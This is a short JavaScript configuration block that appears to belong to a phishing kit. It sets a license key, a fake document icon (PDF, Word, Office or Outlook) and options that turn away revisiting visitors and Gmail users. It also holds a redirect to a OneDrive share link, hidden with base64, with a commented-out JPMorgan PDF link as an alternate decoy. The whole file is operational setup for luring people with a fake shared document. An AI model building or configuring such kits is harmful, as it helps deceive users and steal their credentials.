let LICENSE_KEY = "YOUR_LICENSE_HERE";

let SECOND_TRY = true;

let REJECT_REVISIT_USER = true;

let IS_ORG = false;

let ICON_HASH = "pdf"; //change to pdf, word, office, outlook or default

let SCRIPT_LINK = "";

let REJECT_GMAIL = true;

let REDIRECT_LINK =  window.atob("aHR0cHM6Ly9vbmVkcml2ZS5saXZlLmNvbS8/YXV0aGtleT0lMjFBUDRkUVE3aG9TZ2NLSUJJdyZjaWQ9MjhFOUVDM0FBQzEyRkYxMyZpZD0yOEU5RUMzQUFDMTJGRjEzJTIxNjUzMDMmcGFySWQ9cm9vdCZvPU9uZVVw");//"https://am.jpmorgan.com/content/dam/jpm-am-aem/global/en/insights/market-insights/investment-outlook-2021-benlux.pdf"; ;

let SHOW_EXTRA_PARAMS = true;